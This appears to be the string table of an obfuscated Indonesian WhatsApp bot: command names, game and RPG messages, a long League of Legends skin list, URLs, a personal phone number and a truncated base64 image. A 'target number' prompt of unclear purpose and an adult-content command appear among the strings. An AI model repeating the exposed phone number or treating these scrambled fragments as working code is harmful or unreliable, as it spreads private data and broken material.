'GrandLegends 忍¹', '70 Hari Lagi', 'matchAll', '#funmenu', 'foot', 'cogan', '\x0aFollowing : ', ' ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K', '*Sisa uang:* ', ' Membatalkan Game', '\x0aJawaban : *', '2RaDMoS', 'Kald', '#delsetleft', 'post', 'getAfkId', '\x0a\x0aKirim perintah .tebakgambar untuk bermain lagi 🎮', './datanya/anime/kotori', 'Harus berupa angka', 'groupMetadata', '@user', ' 🥈\x0a\x0aPemenangnya adalah [ @', 'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu', 'killgoblin', 'Pertanyaan : Apakah ', '*Title:* ', 'jualstone', '\x0aあ Views : ', '100 Hari Lagi', 'Sukses Menambahkan Image\x0aCek dengan cara ', 'gtiktok', 'Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan', 'messagecoffee', 'Clare View Point', 'summerbeach', ' *jumlah limit yang ingin dibeli*\x0a\x0aHarga 1 limit = $50 balance', 'https://spotifyku.my.id/download?url=', 'Legends 9', '#randomquotes', 'playerX', ' 6285600793871', 'addvid', 'halloween2', 'dbfly', '*under-flower (Text)*\x0a│3 ▸ ', 'multicolor', 'heartcup', 'cardhalloween', ' ikan kamu belum cukup, minimal 2 ikan', 'text-cup', 'error', '2009', 'asmaulhusna', ',;;;\x0aFN:', ' *text*\x0a\x0a_Contoh_\x0a\x0a', 'scifi', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json', 'lopyu', 'Tetap Tertawa Walaupun Cringe🗿', '*◻️️ Iron* : ', 'listcoverbannerlol', 'vid_360p', 'storagemenu', 'changed', 'Pro × GrandLegends 숒', 'auto', 'cekganteng', 'Menfess berhasil di tolak 🤚', '❌ Terjadi kesalahan, mungkin nmr nya privat', '40 Hari Lagi', 'Jungle', './lib', '*「 PENJUALAN BERHASIL 」*', 'Sedang menebang, silahkan tunggu...', 'Legends 忍³', '*Sisa coal:* ', '*Ikan Anda Tidak Cukup*', 'https://telegra.ph/file/2b9b53837d9f109862224.jpg', '\x0a༫ Creation Group : ', 'fat', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json', '599519108102353', './database/set_open.json', '1️⃣', 'Emelle', 'Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\x0aKetik *', 'Masukkan nomor target!', ' : ', '*Jumlah bahankimia dijual:* ', 'cheerio', 'Sukses join Rpg games', ' -vf scale=', '      \"jinx7\",\x0a        \"jinx-8\",\x0a        \"kassadin-5\",\x0a        \"nissfortune-5\",\x0a        \"pyke-7\",\x0a        \"riven-8\",\x0a        \"sylas-5\",\x0a        \"vayne-9\",\x0a        \"kassadin-4\",\x0a        \"qiyana-5\",\x0a        \"renataglasc\",\x0a        \"shen-5\",\x0a        \"heimerdinger-3\",\x0a        \"nunu-5\",\x0a        \"orianna-4\",\x0a        \"ziggs-4\",\x0a        \"soraka-9\",\x0a        \"soraka-10\",\x0a        \"xayah-3\",\x0a        \"zeri-2\",\x0a        \"ahri-9\",\x0a        \"akshan-2\",\x0a        \"amumu-4\",\x0a        \"annie-3\",\x0a        \"bard-3\",\x0a        \"brand-5\",\x0a        \"diana-4\",\x0a        \"draven-3\",\x0a        \"ekko-6\",\x0a        \"elise-4\",\x0a        \"ezreal-7\",\x0a        \"gwen-3\",\x0a        \"janna-6\",\x0a        \"kindred-3\",\x0a        \"leblanc-7\",\x0a        \"leona-7\",\x0a        \"lissandra-4\",\x0a        \"lux-8\",\x0a        \"lux-9\",\x0a        \"nalzahar-4\",\x0a        \"nasteryi-7\",\x0a        \"reksai-3\",\x0a        \"sett-3\",\x0a        \"sivir-6\",\x0a        \"teemo-5\",\x0a        \"tristana-6\",\x0a        \"vladimir-5\",\x0a        \"xinzhao-5\",\x0a        \"zed-7\",\x0a        \"zeri\",\x0a        \"caitlyn-6\",\x0a        \"caitlyn-7\",\x0a        \"caitlyn-8\",\x0a        \"caitlyn-9\",\x0a        \"caitlyn-10\",\x0a        \"caitlyn-11\",\x0a        \"jayce-5\",\x0a        \"kaisa-8\",\x0a        \"karma-7\",\x0a        \"thresh-6\",\x0a        \"vi-5\",\x0a        \"yasuo-8\",\x0a        \"yasuo-9\",\x0a        \"fiora-8\",\x0a        \"norgana-7\",\x0a        \"nami-5\",\x0a        \"poppy-4\",\x0a        \"syndra-5\",\x0a        \"yuumi-4\",\x0a        \"jarvaniv-6\",\x0a        \"kayn-4\",\x0a        \"kayle-5\",\x0a        \"lillia-2\",\x0a        \"norgana-6\",\x0a        \"tryndamere-3\",\x0a        \"vex\",\x0a        \"vex-2\",\x0a        \"yone-4\",\x0a        \"tristana-5\",\x0a        \"viego-2\",\x0a        \"akali-10\",\x0a        \"anivia-4\",\x0a        \"darius-5\",\x0a        \"graves-6\",\x0a        \"seraphine-5\",\x0a        \"shaco-2\",\x0a        \"twistedfate-4\",\x0a        \"xayah-2\",\x0a        \"zyra-5\",\x0a        \"ahri-8\",\x0a        \"ashe-6\",\x0a        \"cassiopeia-4\",\x0a        \"evelynn-6\",\x0a        \"leblanc-6\",\x0a        \"nalphite-4\",\x0a        \"warwick-5\",\x0a        \"akshan\",\x0a        \"graves-5\",\x0a        \"nissfortune-5\",\x0a        \"pyke-6\",\x0a        \"rengar-6\",\x0a        \"thresh-5\",\x0a        \"diana-3\",\x0a        \"relia-11\",\x0a        \"olaf-3\",\x0a        \"pantheon-6\",\x0a        \"pantheon-7\",\x0a        \"riven-7\",\x0a        \"vayne-8\",\x0a        \"corki-4\",\x0a        \"naokai-2\",\x0a        \"rammus-4\",\x0a        \"veigar-4\",\x0a        \"zed-6\",\x0a        \"camille-4\",\x0a        \"drmundo-3\",\x0a        \"lucian-6\",\x0a        \"nordekaiser-4\",\x0a        \"renekton-4\",\x0a        \"sejuani-5\",\x0a        \"senna-3\",\x0a        \"sylas-4\",\x0a        \"varus-5\",\x0a        \"xerath-3\",\x0a        \"damwon\",\x0a        \"galio-3\",\x0a        \"gwen\",\x0a        \"gwen-2\",\x0a        \"jax-5\",\x0a        \"jinx-6\",\x0a        \"kayle-5\",\x0a        \"sion-2\",\x0a        \"twitch-4\",\x0a        \"velkoz-4\",\x0a        \"blitzcrank-3\",\x0a        \"leona-6\",\x0a        \"lulu-3\",\x0a        \"lulu-4\",\x0a        \"lux-7\",\x0a        \"nasus-5\",\x0a        \"nunu-4\",\x0a        \"rumble-2\",\x0a        \"samira-3\",\x0a        \"aphelios-2\",\x0a        \"blitzcrank-2\",\x0a        \"caitlyn-5\",\x0a        \"garen-6\",\x0a        \"kogmaw-4\",\x0a        \"leona-5\",\x0a        \"alzahar-3\",\x0a        \"syndra-4\",\x0a        \"wukong-4\",\x0a        \"yone-3\",\x0a        \"yuumi-3\",\x0a        \"zyra-4\",\x0a        \"alistar-4\",\x0a        \"chogath-2\",\x0a        \"draven-2\",\x0a        \"fiora-7\",\x0a        \"jarvan-5\",\x0a        \"jhin-5\",\x0a        \"karma-6\",\x0a        \"nautilus-2\",\x0a        \"neeko-5\",\x0a        \"shyvana-3\",\x0a        \"viego\",\x0a        \"azir-4\",\x0a        \"diana-4\",\x0a        \"gragas-2\",\x0a        \"janna-5\",\x0a        \"kalista-3\",\x0a        \"katarina-6\",\x0a        \"ornn-2\",\x0a        \"qiyana-4\",\x0a        \"quinn-3\",\x0a        \"rell\",\x0a        \"xinzhao-4\",\x0a        \"anivia-3\",\x0a        \"hecarim-4\",\x0a        \"illaoi-2\",\x0a        \"jayce-4\",\x0a        \"lissandra-3\",\x0a        \"nami-4\",\x0a        \"nasus-4\",\x0a        \"nidalee-5\",\x0a        \"seraphine-4\",\x0a        \"singed-2\",\x0a        \"skarner-2\",\x0a        \"soraka-7\",\x0a        \"varus-4\",\x0a        \"vladimir-4\",\x0a        \"yorick-4\",\x0a        \"zac\",\x0a        \"riven-8\",\x0a        \"ahri-7\",\x0a        \"akali-9\",\x0a        \"evelynn-5\",\x0a        \"kaisa-7\",\x0a        \"lucian-5\",\x0a        \"seraphine\",\x0a        \"seraphine-2\",\x0a        \"seraphine-3\",\x0a        \"aatrox-6\",\x0a        \"amumu-3\",\x0a        \"lise-3\",\x0a        \"fizz-5\",\x0a        \"karma-5\",\x0a        \"zeri-2\",\x0a        \"kassadin-3\",\x0a        \"khazix-4\",\x0a        \"sivir-5\",\x0a        \"twistedfate-3\",\x0a        \"ashe-5\",\x0a        \"brand-4\",\x0a        \"leesin-5\",\x0a        \"olaf-2\",\x0a        \"sett-2\",\x0a        \"kayle-4\",\x0a        \"leblanc-5\",\x0a        \"pyke-5\",\x0a        \"samira\",\x0a        \"samira-2\",\x0a        \"viktor-2\",\x0a        \"yasuo-7\",\x0a        \"zed-5\",\x0a        \"ezreal-6\",\x0a        \"nasteryi-6\",\x0a        \"shen-4\",\x0a        \"sona-4\",\x0a        \"vi-4\",\x0a        \"yone\",\x0a        \"yone-2\",\x0a        \"ziggs-3\",\x0a        \"ahri-6\",\x0a        \"cassiopeia-3\",\x0a        \"kindred-2\",\x0a        \"riven-6\",\x0a        \"kennen-2\",\x0a        \"kogmaw-3\",\x0a        \"lillia\",\x0a        \"syndra-3\",\x0a        \"teemo-4\",\x0a        \"thresh-4\",\x0a        \"vayne-7\",\x0a        \"velkoz-3\",\x0a        \"yasuo-6\",\x0a        \"zoe-4\",\x0a        \"bard-2\",\x0a        \"gnar-3\",\x0a        \"irelia-10\",\x0a        \"nocturne-4\",\x0a        \"poppy-3\",\x0a        \"enna-2\",\x0a        \"volibear-3\",\x0a        \"volibear-4\",\x0a        \"ekko-5\",\x0a        \"fiora-6\",\x0a        \"lucian-4\",\x0a        \"pantheon-5\",\x0a        \"leblanc-4\",\x0a        \"norgana-5\",\x0a        \"urgot-4\",\x0a        \"zyra-3\",\x0a        \"jinx-5\",\x0a        \"sett\",\x0a        \"alistar-3\",\x0a        \"katarina-5\",\x0a        \"lux-5\",\x0a        \"lux-6\",\x0a        \"nasteryi-5\",\x0a        \"nalphite-3\",\x0a        \"nordekaiser-3\",\x0a        \"reksai-2\",\x0a        \"sejuani-4\",\x0a        \"tryndamere-2\",\x0a        \"xerath-2\",\x0a        \"aphelios\",\x0a        \"garen-5\",\x0a        \"jax-4\",\x0a        \"karma-4\",\x0a        \"leesin-4\",\x0a        \"leona-4\",\x0a        \"nidalee-4\",\x0a        \"rengar-5\",\x0a        \"soraka-5\",\x0a        \"soraka-6\",\x0a        \"swain-4\",\x0a        \"sylas-3\",\x0a        \"trundle-2\",\x0a        \"vladimir-3\",\x0a        \"aatrox-5\",\x0a        \"akali-8\",\x0a        \"ekko-4\",\x0a        \"qiyana-3\",\x0a        \"senna\",\x0a        \"yasuo-5\",\x0a        \"ashe-4\",\x0a        \"darius-4\",\x0a        \"hecarim-3\",\x0a        \"norgana-4\",\x0a        \"nami-3\",\x0a        \"riven-4\",\x0a        \"riven-5\",\x0a        \"ryze-3\",\x0a        \"neeko-3\",\x0a        \"eeko-4\",\x0a        \"xayahrakan\",\x0a        \"zoe-3\",\x0a        \"airi-6\",\x0a        \"noctune-3\",\x0a        \"pantheon-3\",\x0a        \"pantheon-4\",\x0a        \"rammus-3\",\x0a        \"udyr-2\",\x0a        \"veigar-3\",\x0a        \"akali-7\",\x0a        \"garen-4\",\x0a        \"irelia-8\",\x0a        \"irelia-9\",\x0a        \"jinx-4\",\x0a        \"lucian-3\",\x0a        \"pyke-4\",\x0a        \"warwick-4\",\x0a        \"caitlyn-3\",\x0a        \"caitlyn-4\",\x0a        \"kaisa-6\",\x0a        \"qiyana\",\x0a        \"qiyana-2\",\x0a        \"yasuo-4\",\x0a        \"jhin-3\",\x0a        \"karma-3\",\x0a        \"nordekaiser-2\",\x0a        \"tristana-4\",\x0a        \"nami\",\x0a        \"poppy-3\",\x0a        \"aatrox\",\x0a        \"lulu\",\x0a        \"braum\",\x0a        \"camille\",\x0a        \"karma\",\x0a        \"kindred\",\x0a        \"hecarim\",\x0a        \"norgana\",\x0a        \"renekton\",\x0a        \"kennen\",\x0a        \"akali\",\x0a        \"varus\",\x0a        \"orianna\",\x0a        \"blitzcrank\",\x0a        \"bloodmoonjhin\",\x0a        \"bloodmoontalon\",\x0a        \"arcaderiven\",\x0a        \"udyr\",\x0a        \"rumble\",\x0a        \"gnar\",\x0a        \"shaco\",\x0a        \"twitch\",\x0a        \"veigar\",\x0a        \"tryndamere\",\x0a        \"viktor\",\x0a        \"trundle\",\x0a        \"ezreal\",\x0a        \"poppy\",\x0a        \"lissandra\",\x0a        \"jax\",\x0a        \"vi\",\x0a        \"vellkoz\",\x0a        \"darius\",\x0a        \"diana\",\x0a        \"corki\",\x0a        \"sivir\",\x0a        \"ryze\",\x0a        \"azir\",\x0a        \"tristana\",\x0a        \"kled\",\x0a        \"volibear\",\x0a        \"twisterfate\",\x0a        \"anivia\",\x0a        \"zyra\",\x0a        \"quinn\",\x0a        \"nissfortune\",\x0a        \"kalista\",\x0a        \"ezrealandshen\",\x0a        \"gangplank\",\x0a        \"hextachannie\",\x0a        \"elementalistlux\",\x0a        \"xinzhao\",\x0a        \"vayne\",\x0a        \"jhin\",\x0a        \"reksai\",\x0a        \"graves\",\x0a        \"kogmaw\",\x0a        \"garen\",\x0a        \"porojinx\",\x0a        \"warwick\",\x0a        \"fizz\",\x0a        \"caitlyn\",\x0a        \"rengar\",\x0a        \"talon\",\x0a        \"nidalee\",\x0a        \"lux\",\x0a        \"jinx\",\x0a        \"thresh\",\x0a        \"wukong\",\x0a        \"sona\",\x0a        \"ahri\",\x0a        \"riven\",\x0a        \"zed\",\x0a        \"leesin\",\x0a        \"janna\",\x0a        \"katarina\",\x0a        \"leblanc\",\x0a        \"leona\",\x0a        \"fiora\",\x0a        \"lucian\",\x0a        \"shen\",\x0a        \"ziggs\",\x0a        \"yasuo\",\x0a        \"ekko\",\x0a        \"draven\",\x0a        \"ashe\",\x0a        \"ekko-5\",\x0a        \"teemo\",\x0a        \"khazix\",\x0a        \"nasteryi\",\x0a        \"brand\",\x0a        \"taliyah\",\x0a        \"nocturne\",\x0a        \"cassiopeia\",\x0a        \"xayah\",\x0a        \"rakan\",\x0a        \"syndra\",\x0a        \"irelia\",\x0a        \"leesingf\",\x0a        \"yasuobm\",\x0a        \"aurelionsol\",\x0a        \"pantheon\",\x0a        \"bard\",\x0a        \"singed\",\x0a        \"soraka\",\x0a        \"taric\",\x0a        \"naokai\",\x0a        \"xerath\",\x0a        \"gragas\",\x0a        \"jayce\",\x0a        \"riven3\",\x0a        \"nalphite\",\x0a        \"naster_yi2\",\x0a        \"chogath\",\x0a        \"zed2\",\x0a        \"darius2\",\x0a        \"talon2\",\x0a        \"kayle\",\x0a        \"drmundo\",\x0a        \"rammus\",\x0a        \"vladimir\",\x0a        \"ahri-2\",\x0a        \"karma-2\",\x0a        \"jarvan\",\x0a        \"nidalee-2\",\x0a        \"vayner-2\",\x0a        \"warwick-2\",\x0a        \"rengar-2\",\x0a        \"yasuo-3\",\x0a        \"galio\",\x0a        \"pantheon-2\",\x0a        \"jinx-2\",\x0a        \"nalzahar\",\x0a        \"olaf\",\x0a        \"shyvana\",\x0a        \"thresh-2\",\x0a        \"sion\",\x0a        \"caitlyn-2\",\x0a        \"swain\",\x0a        \"kassadin\",\x0a        \"heimerdinger\",\x0a        \"amumu\",\x0a        \"alistar\",\x0a        \"nasus\",\x0a        \"sejuani\",\x0a        \"ezreal3\",\x0a        \"nautilus\",\x0a        \"fiddlesticks\",\x0a        \"sona2\",\x0a        \"karthus\",\x0a        \"ekko2\",\x0a        \"orianna2\",\x0a        \"velkoz-2\",\x0a        \"xinzhao2\",\x0a        \"garen2\",\x0a        \"annie-2\",\x0a        \"yasuonb\",\x0a        \"rivendb\",\x0a        \"kayn\",\x0a        \"kaisa\",\x0a        \"veigar-2\",\x0a        \"vayne-3\",\x0a        \"twitch-2\",\x0a        \"tristana-2\",\x0a        \"rhaast\",\x0a        \"nalzahar-2\",\x0a        \"kayle-2\",\x0a        \"illaoi\",\x0a        \"fizz-2\",\x0a        \"elise\",\x0a        \"brand-2\",\x0a        \"syndra-2\",\x0a        \"soraka-2\",\x0a        \"nissfortune-2\",\x0a        \"hecarim-2\",\x0a        \"ezreal-2\",\x0a        \"ahri-3\",\x0a        \"yorick\",\x0a        \"z-2\",\x0a        \"tahmkench\",\x0a        \"shen-2\",\x0a        \"ornn\",\x0a        \"cassiopeia-2\",\x0a        \"renekton-2\",\x0a        \"nasus-2\",\x0a        \"jarvan-2\",\x0a        \"fiora-2\",\x0a        \"alistar-2\",\x0a        \"taric-2\",\x0a        \"zac-2\",\x0a        \"yorick-2\",\x0a        \"varus-2\",\x0a        \"nordekaiser\",\x0a        \"nasteryi-3\",\x0a        \"katarina-2\",\x0a        \"janna-2\",\x0a        \"fiora-3\",\x0a        \"evelynn\",\x0a        \"elise-2\",\x0a        \"ashe-2\",\x0a        \"annie\",\x0a        \"zoe\",\x0a        \"vi-2\",\x0a        \"vayne-4\",\x0a        \"rengar-3\",\x0a        \"jhin-2\",\x0a        \"graves-2\",\x0a        \"xayahrakan\",\x0a        \"warwick-3\",\x0a        \"nissfortune-3\",\x0a        \"lux-2\",\x0a        \"jarvaniv\",\x0a        \"zoe-2\",\x0a        \"swain-2\",\x0a        \"sivir-2\",\x0a        \"nissfortune-4\",\x0a        \"jax-2\",\x0a        \"galio-2\",\x0a        \"varus-3\",\x0a        \"urgot\",\x0a        \"twistedfate-2\",\x0a        \"taric-3\",\x0a        \"swain-3\",\x0a        \"shen-3\",\x0a        \"rammus-2\",\x0a        \"pyke-2\",\x0a        \"pyke\",\x0a        \"nasus-3\",\x0a        \"talon\",\x0a        \"khazix-2\",\x0a        \"kayn-2\",\x0a        \"irelia-2\",\x0a        \"evelynn-2\",\x0a        \"akali-2\",\x0a        \"vladimir-2\",\x0a        \"jayce-2\",\x0a        \"janna-3\",\x0a        \"irelia-4\",\x0a        \"irelia-3\",\x0a        \"diana-2\",\x0a        \"zed-3\",\x0a        \"teemo-2\",\x0a        \"taliyah-2\",\x0a        \"shyvana-2\",\x0a        \"poppy-2\",\x0a        \"katarina-3\",\x0a        \"jax-3\",\x0a        \"garen-3\",\x0a        \"darius-3\",\x0a        \"chogath-2\",\x0a        \"aatrox-2\",\x0a        \"soraka-3\",\x0a        \"sona-3\",\x0a        \"sivir-3\",\x0a        \"kaisa-2\",\x0a        \"akali-4\",\x0a        \"akali-3\",\x0a        \"xinzhao-3\",\x0a        \"urgot-3\",\x0a        \"urgot-2\",\x0a        \"tristana-3\",\x0a        \"talon-3\",\x0a        \"sejuani-2\",\x0a        \"nunu-2\",\x0a        \"lulu-2\",\x0a        \"lucian-2\",\x0a        \"irelia-6\",\x0a        \"irelia-5\",\x0a        \"ashe-3\",\x0a        \"ziggs-2\",\x0a        \"yasuo-2\",\x0a        \"sona-4\",\x0a        \"nalphite-2\",\x0a        \"khazix-3\",\x0a        \"kayn-3\",\x0a        \"jinx-3\",\x0a        \"orianna-3\",\x0a        \"kaisa-4\",\x0a        \"kaisa-3\",\x0a        \"heimerdinger-2\",\x0a        \"ezreal-4\",\x0a        \"evelynn-3\",\x0a        \"akali-5\",\x0a        \"ahri-4\",\x0a        \"thresh-3\",\x0a        \"ryze-2\",\x0a        \"kled-2\",\x0a        \"janna-4\",\x0a        \"graves-3\",\x0a        \"fiddlesticks-2\",\x0a        \"ekko-3\",\x0a        \"amumu-2\",\x0a        \"nami-2\",\x0a        \"lulusoraka\",\x0a        \"lissandra-2\",\x0a        \"leona-3\",\x0a        \"leona-2\",\x0a        \"leblanc-2\",\x0a        \"ezrealmissfortune\",\x0a        \"camille-2\",\x0a        \"twitch-3\",\x0a        \"soraka-4\",\x0a        \"renekton-3\",\x0a        \"neeko-2\",\x0a        \"neeko\",\x0a        \"nasteryi-4\",\x0a        \"drmundo-2\",\x0a        \"akali-6\",\x0a        \"zyra-2\",\x0a        \"zilean\",\x0a        \"wukong-3\",\x0a        \"wukong-2\",\x0a        \"teemo-3\",\x0a        \"skarner\",\x0a        \"sivir-4\",\x0a        \"riven-2\",\x0a        \"quinn-2\",\x0a        \"pyke-3\",\x0a        \"nocturne-2\",\x0a        \"nidalee-3\",\x0a        \"norgana-2\",\x0a        \"leesin-3\",\x0a        \"kogmaw-2\",\x0a        \"kassadin-2\",\x0a        \"karthus-2\",\x0a        \"kalista-2\",\x0a        \"gnar-2\",\x0a        \"gangplank-2\",\x0a        \"corki-2\",\x0a        \"azir-3\",\x0a        \"azir-2\",\x0a        \"aatrox-4\",\x0a        \"aatrox-3\",\x0a        \"vi-3\",\x0a        \"vayne-6\",\x0a        \"vayne-5\",\x0a        \"tahmkench-2\",\x0a        \"sylas-2\",\x0a        \"sylas\",\x0a        \"sejuani-3\",\x0a        \"fiora-4\",\x0a        \"nunu-3\",\x0a        \"norgana-3\",\x0a        \"kayle-3\",\x0a        \"brand-3\",\x0a        \"anivia-2\",\x0a        \"ahri-5\",\x0a        \"yorick-3\",\x0a        \"rengar-4\",\x0a        \"fizz-4\",\x0a        \"fizz-3\",\x0a        \"corki-3\",\x0a        \"zed-4\",\x0a        \"rakan-2\",\x0a        \"leblanc-3\",\x0a        \"kaisa-5\",\x0a        \"jarvaniv\",\x0a        \"ivern\",\x0a        \"irelia-7\",\x0a        \"fiora-5\",\x0a        \"evelynn-4\",\x0a        \"camille-3\",\x0a        \"yuumi-2\",\x0a        \"yuumi\",\x0a        \"lux-4\",\x0a        \"lux-3\",\x0a        \"katarina-4\",\x0a        \"jayce-3\",\x0a        \"graves-4\",\x0a        \"ezreal-5\"', 'Bot', '401', 'natsukawa', '20% Semangat Ya bang👍', 'stabledif', '\x0a*• Jam :* ', 'https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg', ' *text|logo*\x0a*Untuk List Logo Ketik .list', '╭─▸ *LIST LOGO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *style-1*\x0a│2 ▸ *style-2*\x0a│3 ▸ *style-3*\x0a│4 ▸ *style-4*\x0a│5 ▸ *style-5*\x0a│6 ▸ *style-6*\x0a│7 ▸ *style-7*\x0a│8 ▸ *style-8*\x0a│9 ▸ *style-9*\x0a│10 ▸ *style-10*\x0a│11 ▸ *style-11*\x0a│12 ▸ *style-12*\x0a│\x0a╰────────────˧', 'ahegao', '#changeleft', 'kedalaman', 'coffeecup2', 'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila', 'GrandMaster ✩✩✩', 'delcasino', '\x0a*• Wilayah :* ', 'Besok', 'chat', 'user', '.png?background=', 'redBright', 'Bronze 2', 'delcasino*, untuk menghapus sesi', ' emerald 2\x0a 1 Emerald = 100000 Money', '#nuliskanan', 'Upss error silahkan gunakan fitur ai yang pertama dengan cara ketik .ai (Pertanyaan)\x0aContoh : .ai Sebutkan negara asean', './database/antilink2.json', 'Frostford', 'Rodeo', '1917text', 'Awas Ada Gay😱', 'remove', 'senpder', 'glitter', 'earrape', 'linkgroup', 'listimg', '6285600793871-1614953337@g.us', '𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳...', '\x0a\x0aKirim perintah .telo untuk bantuan dan .ytelo untuk menyerah 🎮', 'Cirencester', 'glossyc', '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